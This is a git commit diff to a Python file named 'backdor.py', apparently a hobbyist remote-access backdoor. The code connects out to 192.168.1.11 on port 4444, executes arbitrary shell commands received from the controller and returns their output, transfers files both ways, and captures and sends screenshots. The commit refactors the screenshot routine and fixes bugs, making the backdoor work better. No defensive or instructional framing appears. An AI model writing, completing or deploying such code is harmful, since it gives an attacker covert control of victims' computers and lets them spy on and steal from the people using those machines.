85e6febcbcca15e2366462adaf5bcfa3a01967be
gauss <pedreleco@gmail.com>
2023-11-15 19:35:36 -0300

    server-completo-porem-nao-muito-funcional2

--- backdor.py
+++ backdor.py
@@ -10,16 +10,15 @@ def data_send(data):
         jsondata = json.dumps(data)
         soc.send(jsondata.encode())
     except BrokenPipeError:
-        socket.close()
+        soc.close()
         sys.exit()
-    
+
 def data_recv():
     data = ""
     while True:
         try:
             data = data + soc.recv(4096).decode().rstrip()
             return json.loads(data)
-        
         except ValueError:
             continue
 
@@ -32,7 +31,6 @@ def download_arq(arquivo):
         arq.write(chunk)
         try:
             chunk = soc.recv(4096)
-        
         except socket.timeout as a:
             break
 
@@ -43,46 +41,33 @@ def upload_arq(arquivo):
     arq = open(arquivo, "rb")
     soc.send(arq.read())
 
-def print():
+def print_screen(count):
     screenshot = pyautogui.screenshot()
-    screenshot.save("print.png")
-    upload_arq("print.png")
-    os.remove("print.png")
-    download_arq("print.png")
-    os.remove("print.png")
-
-    
+    screenshot.save(f"print{count}.png")
+    upload_arq(f"print{count}.png")
+    os.remove(f"print{count}.png")
+    download_arq(f"print{count}.png")
+    os.remove(f"print{count}.png")
 
 def shell():
+    count = 0
     while True:
-
         comando = data_recv()
         if comando == "exit":
             break
-
         elif comando == "clear":
             pass
-
         elif comando[:3] == "cd ":
             os.chdir(comando[3:])
-
         elif comando[:6] == "upload":
             download_arq(comando[7:])
-
-        elif comando [:8] == "download":
+        elif comando[:8] == "download":
             upload_arq(comando[9:])
-        
-        elif comando [:5] == "print":
-            screenshot = pyautogui.screenshot()
-            screenshot.save("print.png")
-            upload_arq("print.png")
-            os.remove("print.png")
-            download_arq(f"print{count}.png")
-            os.remove(f"print{count}.png")
-
+        elif comando[:5] == "print":
+            print_screen(count)
+            count += 1
         elif comando == "help":
             pass
-
         else:
             exe = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             rcomm = exe.stdout.read() + exe.stderr.read()
@@ -90,5 +75,5 @@ def shell():
             data_send(rcomm)
 
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-soc.connect(("192.168.1.11",4444))
+soc.connect(("192.168.1.11", 4444))
 shell()
